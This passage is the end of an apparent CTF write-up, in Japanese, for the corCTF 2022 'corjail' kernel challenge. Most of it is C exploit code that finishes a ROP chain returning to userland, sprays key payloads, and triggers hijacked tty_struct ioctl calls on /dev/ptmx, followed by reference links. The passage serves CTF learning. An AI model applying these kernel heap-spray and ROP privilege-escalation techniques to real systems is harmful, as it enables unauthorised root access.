                                               // mov rdi,rsp; mov rsp,QWORD PTR gs:0x6004; push QWORD PTR [rdi+0x30]; ...
    *rop++ = 0;
    *rop++ = 0;
    *rop++ = (ulong)NIRUGIRI;
    *rop++ = user_cs;
    *rop++ = user_rflags;
    *rop++ = (ulong)krop_stack + KROP_USTACK_SIZE / 2;
    *rop++ = user_ss;

    printf("[+] size: 0x%lx\n", (ulong)rop - (ulong)key_payload);
    assert((ulong)rop - (ulong)key_payload <= NUM_3RD_KEY_SIZE);
    assert(512 < NUM_3RD_KEY_SIZE + 0x10 && NUM_3RD_KEY_SIZE + 0x10 < 1024);
    for (int ix = 0; ix != NUM_3RD_KEY_SPRAY; ++ix) alloc_key(key_payload, NUM_3RD_KEY_SIZE + 0x10, NULL);
  }

  // Invoke tty_struct.ops.ioctl
  puts("[+] ioctl-ing to /dev/ptmx");
  for (int ix = 0; ix != NUM_TTY_SPRAY; ++ix) {
    ioctl(tty_fd[ix], 0x1234567890, 0xABCDE0000);
  }

  // end of life (unreachable)
  puts("[ ] END of life...");
  //sleep(999999);
}
```

# 参考

- [Author's writeup](https://syst3mfailure.io/corjailhttps://syst3mfailure.io/corjail)
- [corCTF2022 archive](https://github.com/Crusaders-of-Rust/corCTF-2022-public-challenge-archive/tree/master/pwn/corjail/task/build)
